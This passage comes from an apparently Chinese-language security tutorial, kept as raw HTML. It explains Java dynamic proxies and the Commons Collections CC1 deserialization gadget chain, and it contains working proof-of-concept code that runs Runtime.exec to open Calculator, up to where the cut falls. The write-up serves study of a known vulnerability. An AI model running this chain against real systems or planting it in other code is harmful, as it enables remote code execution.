punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Agent</span> <span class="token keyword">implements</span> <span class="token class-name">InvocationHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">Object</span> sub<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Agent</span><span class="token punctuation">(</span><span class="token class-name">Object</span> sub<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>sub <span class="token operator">=</span> sub<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span> proxy<span class="token punctuation">,</span> <span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"开始代理"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> obj <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>sub<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> obj<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代理类需要实现  InvocationHandler 接口，同时重写 一下 invoke 方法，invoke方法中，可以加入代理的扩展功能，同时反射调用目标对象的指定方法。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>proxy</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationHandler</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> main<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">Subject</span> realsubject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RealSubject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ClassLoader</span> classLoader <span class="token operator">=</span> realsubject<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> interfaces <span class="token operator">=</span> realsubject<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Agent</span><span class="token punctuation">(</span>realsubject<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Subject</span> sub <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Subject</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>classLoader<span class="token punctuation">,</span>interfaces<span class="token punctuation">,</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span>        sub<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>动态代理的主要流程：</p><ul><li><code>Subject realsubject = new RealSubject();</code>实现目标类的实例化</li><li><code>ClassLoader classLoader = realsubject.getClass().getClassLoader();</code>这一步获取类加载器</li><li><code>Class[] interfaces = realsubject.getClass().getInterfaces();</code>获取目标类的接口列表</li><li><code>InvocationHandler handler = new Agent(realsubject);</code> 创建 <code>InvocationHandler</code> 实例，用来处理 <code>Proxy</code> 所有方法调用</li><li><code>Subject sub = (Subject) Proxy.newProxyInstance(classLoader,interfaces,handler);</code> 使用<code>Proxy</code>类的<code>newProxyInstance</code> 方法创建的实例化一个代理对象，分别传入类加载器，代理接口，和<code>Handler</code>处理器。</li><li><code>sub.request();</code> 最后调用代理对象的方法。</li></ul><h2 id="p神的简化demo"><a href="#p神的简化demo" class="headerlink" title="p神的简化demo"></a>p神的简化demo</h2><p>代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>p</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">TransformedMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonCollections1</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span>                                <span class="token punctuation">{</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span>                <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> outerMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span>                transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        outerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"xxxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>环境：commons-collections-3.1&amp;&amp;jdk8</p><p>一个在mac环境下弹计算器的demo，我们对于几个接口和类进行分析：</p><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a><strong>TransformedMap</strong></h3><p>倒入这个库用于对Java的标准数据结构Map进行修饰，被修饰的Map在添加新的元素时可执行一个回调。关于回调机制：</p><blockquote><p>回调是实现异步调用的一种手段，是为了异步通信服务的</p><p>A对象 —-B.fb(A) —–&gt; B对象  // 调用B的fb()时传入A本身（this）<br>A对象 &lt;—–A.fa()—— B对象  // B就可以直接调用A，fa()就是回调方法</p><p>AImpl —-B.fb(IA) —–&gt; B对象  // IA是抽象接口，AImpl是IA的实现类<br>AImpl &lt;—–IA.fa()—— B对象</p><p>AImpl —-B.fb(IA) —–&gt; B对象  // B.fb(IA)单独起一个线程执行<br>AImpl &lt;—–IA.fa()—— B对象</p></blockquote><p>在这段demo中：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span> outerMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span>                transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中，keyTransformer是处理新元素的Key的回调，valueTransformer是处理新元素的value的回调。 我们这里所说的”回调“，并不是传统意义上的一个回调函数，而是一个实现了Transformer接口的类。</p><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a><strong>Transformer</strong></h3><p><img src="https://s2.loli.net/2022/03/16/g7xMLc3XFC8raop.png" alt="image-20220316185149896"></p><p>显然，<strong>Transformer</strong>是一个接口，存在一个<strong>transform</strong>方法，<strong>TransformedMap</strong>在转换<strong>Map</strong>的新元素时，就会调用<strong>transform</strong>方法，这个过程就类似在调用一个”回调 函数“，这个回调的参数是原始对象。</p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a><strong>ConstantTransformer</strong></h3><p><img src="https://s2.loli.net/2022/03/16/PWBie3tsFSwaVQY.png" alt="image-20220316190405282"></p><p>可以看出，ConstantTransformer是实现了上面所说的Transformer接口的类，也同时实现了Serializable接口。</p><p><img src="https://s2.loli.net/2022/03/16/3l1GSFaYByKWgdv.png" alt="image-20220316191448039"></p><p>这里ConstantTransformer实现了Transformer接口，也重写了transform方法。它的作用就是包装任意一个对象，然后在执行回调时使用transformer方法返回这个对象。</p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a><strong>InvokerTransformer</strong></h3><p><img src="https://s2.loli.net/2022/03/16/8FfRgYLyZ3HstBr.png" alt="image-20220316191706557"></p><p>这个类也是实现了Transformer接口，并且是实现rce的重要类。可以看到此类要求传入三个参数：</p><ul><li>String methodName：需要实现的方法名，类型是字符串</li><li>Class[] paramTypes： 函数参数列表的参数类型，类型是数组</li><li>Object[] args： 参数列表，类型是数组</li></ul><p><img src="https://s2.loli.net/2022/03/16/Z89wUJyR63zkxQB.png" alt="image-20220316192656825"></p><p>后面也是实现了回调函数transform，此方法内容很好理解，传入的input是一个对象，下面通过反射原理，去执行input对象的iMethodName方法。过程中用到的参数就是上面构造函数所定义的参数。</p><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a><strong>ChainedTransformer</strong></h3><p>这个类的构造方法接受一个Transformer 接口类型的数组，作用是将内部的多个Transformer串在一起。</p><h3 id="调试demo"><a href="#调试demo" class="headerlink" title="调试demo"></a>调试demo</h3><p><img src="https://s2.loli.net/2022/03/16/qgoCXNyrZ8aFB1Q.png" alt="image-20220316193622528"></p><p>由ChainedTransformer实例化的对象transformers中包含了两个对象，分别由ConstantTransformer和InvokerTransformer实例化。ConstantTransformer实例化对象的iConstant是Runtime.getRuntime()，InvokerTransformer实例化对象的参数则是要传入前面Runtime.getRuntime()的参数。</p><p>回调已经构造完成，我们新建一个Map结构的innerMap，使用TransformedMap进行修饰成outerMap。再通过向outerMap中放入新元素触发回调即可。</p><p><img src="https://s2.loli.net/2022/03/16/kSbydYLeWFPBaX6.png" alt="image-20220316194835969"></p><h2 id="实际情况下的cc链"><a href="#实际情况下的cc链" class="headerlink" title="实际情况下的cc链"></a>实际情况下的cc链</h2><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>ysoserial中使用<strong>LazyMap</strong>来替代我们上面demo中的<strong>TransformedMap</strong></p><p>LazyMap也同样来自Common-Collections，继承AbstractMapDecorator。与TransformedMap不同，LazyMap中的transform方法的触发点在其get方法中执行的factory.transform。</p><p><img src="https://s2.loli.net/2022/03/19/ktSEOMV6P1Lw8i2.png" alt="image-20220319205123281"></p><h3 id="使用LazyMap构造利用链（CC1）"><a href="#使用LazyMap构造利用链（CC1）" class="headerlink" title="使用LazyMap构造利用链（CC1）"></a>使用LazyMap构造利用链（CC1）</h3><p>之前的demo触发漏洞的方法是我们手动往outerMap中放入一个新元素，触发回调。在实际的反序列化中，我们需要找到一个类，他的readObject方法中有类似的写入操作，就是sun.reflect.annotation.AnnotationInvocationHandler。</p><p>在8u17之前的版本中，sun.reflect.annotation.AnnotationInvocationHandler代码中存在<code>Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()</code>和 <code>memberValue.setValue(...)</code>，其中memberValue就是反序列化得到的Map，从而触发漏洞的下一步。</p><p>但是要使用到LazyMap替换TransformedMap，我们需要触发的transform方法存在于其get方法的factory.transform中。factory属性并没有被声明为短暂的，是可控的，且在构造函数中定义。在sun.reflect.annotation.AnnotationInvocationHandler#readObject方法中并没有使用到Map的get方法，但是此类中的invoke方法中存在get方法的调用。巧了是invoke方法，我们可以使用动态代理的方式来触发invoke方法。注意sun.reflect.annotation.AnnotationInvocationHandler类的定义：</p><p><img src="https://s2.loli.net/2022/03/20/4fNteAIgYd5CDTm.png" alt="image-20220320181344408"></p><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code>这个类实现了InvocationHandler接口，所以我们将这个对象使用Proxy进行代理，在readObject的时候就能触发invoke方法。</p><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code>这个类是JDK的内部类，不能直接实例化，我们通过反射获取其实例。我们构造一个AnnotationInvocationHandler对象，并且对其进行Proxy：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Constructor</span> construct <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>construct<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span>construct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Retention</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> outerMap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Map</span> proxyMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span><span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们还不能直接对proxyMap进行序列化，因为我们的序列化入口是<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>，所以我们还需要使用AnnotationInvocationHandler对proxyMap进行包裹</p><p>POC：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>p</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Retention</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationHandler</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> CC1 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"open /System/Applications/Calculator.app"</span><span class="token punctuation">}</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span>                <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> construct <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        construct<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span>construct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Retention</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> outerMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> proxyMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span><span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>        handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span>construct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Retention</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> proxyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span>  oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span 